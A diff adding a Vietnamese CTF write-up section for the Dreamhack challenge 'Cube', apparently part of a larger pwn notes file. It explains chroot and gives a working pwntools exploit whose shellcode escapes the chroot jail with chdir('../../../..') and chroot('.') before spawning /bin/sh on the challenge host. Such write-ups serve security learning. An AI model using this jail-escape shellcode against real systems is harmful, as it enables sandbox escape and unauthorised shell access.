@@ -1890,3 +1890,67 @@ p.interactive()
 
 - 1 cách khác nữa là sử dụng gadget này : ```0x000000000040213a: mov dword ptr [rdi], eax; or eax, 0xffffffff; ret;``` , mình lười quá nên để ở đây , ta cần setup **rax** sẽ là chuỗi flag và rdi là nơi ta muốn đặt nó vào , chú ý ở đây chỉ được đặt 4 bytes nên nếu path dài thì phải đặt nhiều lần
 - 1 cách khác nữa là dùng ```mprotect``` như **mmap** ta có thể leak **libc_stack_end** để lấy địa chỉ stack và read shellcode vào stack , nói chung vẫn là dùng shellcode để lấy shell 
+
+## Cube
+
+- 1 bài ở dreamhack  
+
+- main: ta thấy nó sẽ `mmap` 1 vùng nhớ với quyền `rwx` tiếp theo là nhập shellcode vào và thực thi nó , ngoài ra còn 1 hàm sandbox ta sẽ cùng xem xét nó 
+
+```c
+int __fastcall main(int argc, const char **argv, const char **envp)
+{
+  void *buf; // [rsp+0h] [rbp-10h]
+
+  buf = mmap(0LL, 0x400uLL, 7, 34, -1, 0LL);
+  init();
+  sandbox();
+  printf("Give me shellcode: ");
+  read(0, buf, 0x50uLL);
+  ((void (*)(void))buf)();
+  return 0;
+}
+```
+
+
+- sandbox: ở đây nó sử dụng `chroot` , ta sẽ cùng tìm hiểu nó là gì
+
+chroot là 1 hàm trong C dùng để giới hạn quyền truy cập của chương trìnhh vào 1 phần nhất định của hệ thống file , Nói cách khác, nó tạo ra một (sandbox), nơi mà chương trình chỉ có thể nhìn thấy và truy cập các tập tin bên trong thư mục được chỉ định.
+
+- và đoạn code bên dưới , nếu thực thi thành công thì Thư mục /home/cube/cube_box sẽ được coi như là thư mục gốc / của chương trình và không thể truy cập ra ngoài được nữa 
+
+```c 
+int sandbox()
+{
+  return chroot("/home/cube/cube_box");
+}
+```
+
+- đầu tiên mình thử gửi shellcode execve('/bin/sh',0,0) và chắc chắn nó sẽ không hoạt động vì hệ thống file bị giới hạn , Chương trình chỉ còn "thấy" những file bên trong /home/cube/cube_box. Tất cả những gì nằm bên ngoài, như /bin/sh, /lib, /etc/passwd... thì bị ẩn hoàn toàn.
+- vì vậy mình đã tìm kiếm 1 giải pháp cho vấn đề này [here](https://blog.pentesteracademy.com/privilege-escalation-breaking-out-of-chroot-jail-927a08df5c28) , ta thấy anh ấy dùng `chdir` để đổi path hiện tại khá nhiều lần cho đến `root` , xong thiết lập `chroot` với đường dẫn hiện tại là `root` , lúc này chỉ cần thực thi execve là sẽ có thể lấy được shell
+
+- vậy tóm lại ta chỉ cần dùng `chdir` đến path của `root` và `chroot('.')` và thực thi `execve`
+
+exp: 
+
+```python
+#!/usr/bin/python3
+
+from pwn import *
+
+context.binary = exe = ELF('./cube',checksec=False)
+
+#p = process()
+p = remote('host3.dreamhack.games', 19615)
+
+
+
+shellcode = shellcraft.chdir("../../../..")
+shellcode += shellcraft.chroot(".")
+shellcode += shellcraft.execve("/bin/sh", 0, 0)
+shellcode = asm(shellcode)
+p.sendafter(b'shellcode: ',shellcode)
+
+p.interactive()
+```
+
